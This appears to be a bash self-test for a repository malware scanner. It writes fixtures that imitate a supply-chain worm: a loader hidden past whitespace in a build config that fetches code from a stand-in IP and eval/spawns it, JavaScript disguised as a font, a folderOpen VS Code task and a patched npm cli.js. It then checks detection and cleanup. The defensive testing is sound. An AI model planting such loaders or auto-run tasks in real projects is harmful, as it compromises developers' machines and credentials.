# shellcheck shell=bash
# selftest.sh — prove the detector actually detects. Closes #5.
#
# Every defect in #2 produced a FALSE CLEAN and shipped undetected, because
# nothing ever asserted that a known-bad sample gets flagged. This builds a
# scratch repo of known-bad and known-good samples, runs the real scanner
# against it, and fails loudly on any mismatch.

ST_PASS=0; ST_FAIL=0

_st_ok(){   grn "  PASS  $*"; ST_PASS=$((ST_PASS+1)); }
_st_bad(){  red "  FAIL  $*"; ST_FAIL=$((ST_FAIL+1)); }

_st_gone(){  if [ -e "$1" ]; then _st_bad "$2"; else _st_ok "$2"; fi; }
_st_kept(){  if [ -e "$1" ]; then _st_ok  "$2"; else _st_bad "$2"; fi; }
_st_has(){   if grep -q "$2" "$1" 2>/dev/null; then _st_ok  "$3"; else _st_bad "$3"; fi; }
_st_lacks(){ if grep -q "$2" "$1" 2>/dev/null; then _st_bad "$3"; else _st_ok  "$3"; fi; }

# $1 = human label, $2 = expect (hit|clean), $3 = grep pattern, $4 = scan output
#
# Only [!] lines count as findings. A [~] note (e.g. "this line is long") is
# informational and must NOT fail a known-good sample — minified bundles are
# legitimately long, and treating that as a finding is how you train people to
# ignore the output.
_st_expect(){
  local label="$1" expect="$2" pat="$3" out="$4"
  local findings; findings="$(echo "$out" | grep '\[!\]')"
  if echo "$findings" | grep -qE "$pat"; then
    [ "$expect" = hit ] && _st_ok "$label" || _st_bad "$label (reported as a finding, should be clean)"
  else
    [ "$expect" = clean ] && _st_ok "$label" || _st_bad "$label (NOT flagged — false clean)"
  fi
}

cmd_selftest(){
  local keep=0
  [ "${1:-}" = "--keep" ] && keep=1

  # GNU mktemp requires the XXXXXX template; BSD/macOS does not.
  local T; T="$(mktemp -d "${TMPDIR:-/tmp}/snareselftest.XXXXXX")" \
    || { red "  cannot create a temp directory"; return 1; }
  hdr "snare selftest"
  echo "  scratch: $T"

  ( cd "$T" || exit 1
    git init -q . 2>/dev/null
    git config user.email selftest@snare.local 2>/dev/null
    git config user.name  "snare selftest"     2>/dev/null

    # ---- known BAD samples -------------------------------------------------
    # 1. plain IOC string in a tracked file
    local ioc; ioc="$(grep -m1 -oE '0x[a-fA-F0-9]{40}' "$IOCS" 2>/dev/null)"
    [ -z "$ioc" ] && ioc='0xa322E5f3D311D3080e6f0121063e9aDC2490Ef1a'
    printf 'const c2 = "%s";\n' "$ioc" > bad_ioc.js

    # 2. build config with the payload hidden past a whitespace run.
    #    Deliberately SHORT (~700 chars) — the old `length > 1500` heuristic
    #    missed exactly this, so the test must be shorter than that threshold.
    printf 'export default config;%*sglobal.i="A8-0000-0";var u=new URL("http://1.2.3.4:443/0x/ls");\n' \
      600 '' > postcss.config.mjs

    # 3. fake font: JavaScript wearing a .woff2 extension
    printf 'process.mainModule.require("child_process").spawn("node");\n' > public_fake.woff2

    # 4. editor auto-execution vector
    mkdir -p .vscode
    cat > .vscode/tasks.json <<'JSON'
{ "version": "2.0.0",
  "tasks": [ { "label": "eslint-check", "type": "shell",
    "command": "node ./public_fake.woff2", "hide": true,
    "runOptions": { "runOn": "folderOpen" } } ] }
JSON

    # ---- known GOOD samples (must NOT be flagged) --------------------------
    # 5. genuine TrueType font: magic 00 01 00 00. bash cannot hold NUL, which
    #    is precisely why the old string-compare could never match it.
    printf '\x00\x01\x00\x00' > real_font.ttf
    head -c 2000 /dev/zero 2>/dev/null >> real_font.ttf

    # 6. genuine woff2
    printf 'wOF2' > real_font2.woff2
    head -c 500 /dev/zero 2>/dev/null >> real_font2.woff2

    # 7. long minified-but-clean JS: long line, no whitespace-hidden payload
    { printf 'var a=1;'; for i in $(seq 1 400); do printf 'var x%d=%d;' "$i" "$i"; done; printf '\n'; } > minified.js

    git add -A >/dev/null 2>&1
    git commit -qm "selftest fixtures" >/dev/null 2>&1
  )

  local out; out="$(cmd_scan_repo "$T" 2>&1)"

  hdr "Known-bad samples (must be flagged)"
  _st_expect "IOC string in tracked file"            hit   'bad_ioc\.js'          "$out"
  _st_expect "payload hidden past whitespace (700c)" hit   'postcss\.config\.mjs' "$out"
  _st_expect "fake .woff2 (no wOF2 magic)"           hit   'public_fake\.woff2'   "$out"
  _st_expect "tasks.json runOn:folderOpen"           hit   'folderOpen'           "$out"

  hdr "Known-good samples (must NOT be flagged)"
  _st_expect "genuine .ttf (00 01 00 00 magic)"      clean 'real_font\.ttf'       "$out"
  _st_expect "genuine .woff2 (wOF2 magic)"           clean 'real_font2\.woff2'    "$out"
  _st_expect "long but clean minified JS"            clean 'minified\.js'         "$out"

  hdr "Portability"
  # xxd is absent on minimal Linux images and some Git Bash installs. When it
  # was required, every genuine font read as a payload — and the pre-push hook
  # then blocked every push from any repo containing fonts.
  local _pd; _pd="$(mktemp -d "${TMPDIR:-/tmp}/snarepath.XXXXXX")"
  printf '#!/bin/sh\nexit 127\n' > "$_pd/xxd";    chmod +x "$_pd/xxd"
  printf '#!/bin/sh\nexit 127\n' > "$_pd/shasum"; chmod +x "$_pd/shasum"
  local out2; out2="$(PATH="$_pd:$PATH" cmd_scan_repo "$T" 2>&1)"
  if echo "$out2" | grep '\[!\]' | grep -q 'real_font'; then
    _st_bad "genuine fonts still pass without xxd/shasum"
  else
    _st_ok "genuine fonts still pass without xxd/shasum"
  fi
  if echo "$out2" | grep '\[!\]' | grep -q 'public_fake'; then
    _st_ok "fake font still caught without xxd/shasum"
  else
    _st_bad "fake font still caught without xxd/shasum"
  fi
  rm -rf "$_pd"

  hdr "Scanner self-exclusion"
  local selfout; selfout="$(cmd_scan_repo "$SNARE_ROOT" 2>&1)"
  _st_expect "snare's own lib/ not self-reported"    clean 'lib/scan\.sh'         "$selfout"

  _st_remediation
  _st_doctor

  if [ "$keep" = 1 ]; then dim "  kept: $T"; else rm -rf "$T"; fi

  hdr "RESULT"
  if [ "$ST_FAIL" -eq 0 ]; then
    grn "  all $ST_PASS checks passed — detection is working"
    return 0
  fi
  red "  $ST_FAIL of $((ST_PASS+ST_FAIL)) checks FAILED"
  red "  detection is broken — do not trust a 'clean' result until this passes"
  return 1
}

# Remediation must STRIP a file the project needs and DELETE only what is
# payload and nothing else. `fix` used to delete any file containing an IOC
# string — and the payload appended to postcss.config.mjs IS an IOC string, so
# the build config was deleted before anything could strip it. Nothing asserted
# otherwise, which is how it shipped.
_st_remediation(){
  hdr "Remediation (fix must strip what the project needs, not delete it)"
  local R
  R="$(mktemp -d "${TMPDIR:-/tmp}/snarefixtest.XXXXXX")" \
    || { _st_bad "cannot create a temp directory"; return 1; }

  ( cd "$R" || exit 1
    git init -q . 2>/dev/null
    git config user.email selftest@snare.local 2>/dev/null
    git config user.name  "snare selftest"     2>/dev/null
    python3 - <<'PY'
import os
P = ('global.i = "A8-0000-0";global.r=require,"object"==typeof module&&(global.m=module);'
     'const http=require("node:http"),SENDER="0xa322E5f3D311D3080e6f0121063e9aDC2490Ef1a".toLowerCase(),'
     'INDEXER_URL="https://eth.blockscout.com/api";async function l(u,k){const c=await get(k,u);eval(c),'
     'spawn("node",["-e",c],{detached:!0}).unref()}await l(new URL("http://1.2.3.4:443/0x/cls"),"q4FZkxX");l();')

# must survive, stripped: payload appended to the SAME line
open("postcss.config.mjs", "w").write(
    "export default { plugins: { autoprefixer: {} } };" + " " * 700 + P + "\n")
# must survive, stripped: payload on a line of its OWN
open("package.json", "w").write('{\n  "name": "victim",\n  "version": "1.0.0"\n}\n' + P + "\n")
# payload and nothing else
open("loader.js", "w").write(P + "\n")
os.makedirs("public/fonts", exist_ok=True)
open("public/fonts/fake.woff2", "w").write("require('child_process').spawn('node');\n")
open("public/fonts/real.woff2", "wb").write(b"wOF2" + b"\0" * 400)
open("setup_bun.js", "w").write("// worm artifact\n")
open("index.js", "w").write("console.log('hello');\n")
os.makedirs(".vscode", exist_ok=True)
open(".vscode/tasks.json", "w").write("""{
  "version": "2.0.0",
  "tasks": [
    { "label": "eslint-check", "command": "node ./public/fonts/fake.woff2",
      "runOptions": { "runOn": "folderOpen" } },
    { "label": "build", "command": "npm run build" }
  ]
}
""")
PY
    git add -A >/dev/null 2>&1
    git commit -qm "remediation fixtures" >/dev/null 2>&1
    _fix_clean_tree selftest "$(ioc_pattern)" >/dev/null 2>&1
  )

  _st_kept  "$R/postcss.config.mjs"      "build config survives remediation"
  _st_lacks "$R/postcss.config.mjs" blockscout "build config no longer carries the payload"
  _st_has   "$R/postcss.config.mjs" autoprefixer "build config keeps what the project needs"
  _st_kept  "$R/package.json"            "package.json survives remediation"
  _st_lacks "$R/package.json" blockscout "package.json no longer carries the payload"
  if python3 -c 'import json,sys; json.load(open(sys.argv[1]))' "$R/package.json" 2>/dev/null; then
    _st_ok  "package.json is still valid JSON afterwards"
  else
    _st_bad "package.json is still valid JSON afterwards"
  fi
  _st_gone  "$R/loader.js"               "a file that is nothing but payload is removed"
  _st_gone  "$R/public/fonts/fake.woff2" "a payload wearing a .woff2 extension is removed"
  _st_gone  "$R/setup_bun.js"            "a known worm artifact is removed"
  _st_kept  "$R/public/fonts/real.woff2" "a genuine font is left alone"
  _st_kept  "$R/index.js"                "a clean source file is left alone"
  _st_kept  "$R/.vscode/tasks.json"      "tasks.json survives when it has honest tasks too"
  _st_has   "$R/.vscode/tasks.json" '"build"' "the project's own build task is kept"
  _st_lacks "$R/.vscode/tasks.json" folderOpen "the folderOpen task is gone"

  rm -rf "$R"
}

# The package manager is a file like any other. Nothing checked it until npm's
# own lib/cli.js was found rewritten in place on a live host, so this asserts
# both directions: a patched npm is flagged, an intact one is not.
_st_doctor(){
  hdr "Machine checks (doctor)"
  local D
  D="$(mktemp -d "${TMPDIR:-/tmp}/snaredoctor.XXXXXX")" \
    || { _st_bad "cannot create a temp directory"; return 1; }
  # Normalise. On macOS $TMPDIR ends in a slash, so $D carries a doubled one,
  # while _doctor_npm_roots reports paths through `cd .. && pwd`, which
  # collapses it. The assertion below then could never match its own fixture:
  # the check failed on macOS while passing on Linux CI, reporting "detection
  # is broken" for a detector that was working correctly.
  D="$(cd "$D" && pwd)"

  mkdir -p "$D/bad/bin"  "$D/bad/lib/node_modules/npm/lib"
  mkdir -p "$D/good/bin" "$D/good/lib/node_modules/npm/lib"
  printf '#!/bin/sh\nexit 0\n' > "$D/bad/bin/node";  chmod +x "$D/bad/bin/node"
  printf '#!/bin/sh\nexit 0\n' > "$D/good/bin/node"; chmod +x "$D/good/bin/node"
  # legit code, a long whitespace run, then the payload — the real signature
  python3 - "$D/bad/lib/node_modules/npm/lib/cli.js" <<'PY'
import sys
open(sys.argv[1], "w").write(
    "module.exports = (process) => validateEngines(process)" + " " * 200
    + "/*RS260605*/global['e']='NPM';eval(atob(x));\n")
PY
  printf 'module.exports = (process) => validateEngines(process)\n' \
    > "$D/good/lib/node_modules/npm/lib/cli.js"

  local out
  out="$(PATH="$D/bad/bin:$PATH" _doctor_node 2>&1)"
  if printf '%s' "$out" | grep -q "$D/bad/.*cli\.js"; then
    _st_ok  "a patched npm cli.js is flagged"
  else
    _st_bad "a patched npm cli.js is flagged (NOT detected — false clean)"
  fi

  out="$(PATH="$D/good/bin:$PATH" _doctor_node 2>&1)"
  if printf '%s' "$out" | grep -q "$D/good/.*cli\.js"; then
    _st_bad "an intact npm cli.js is left alone (reported, should be clean)"
  else
    _st_ok  "an intact npm cli.js is left alone"
  fi

  # guard_state must answer for THIS platform, not only for launchd. The bug
  # it replaces reported "not installed" on Linux and Windows regardless.
  case "$(guard_state)" in
    running|stopped|absent) _st_ok "guard_state answers for $SNARE_OS" ;;
    *)                      _st_bad "guard_state answers for $SNARE_OS" ;;
  esac

  rm -rf "$D"
}
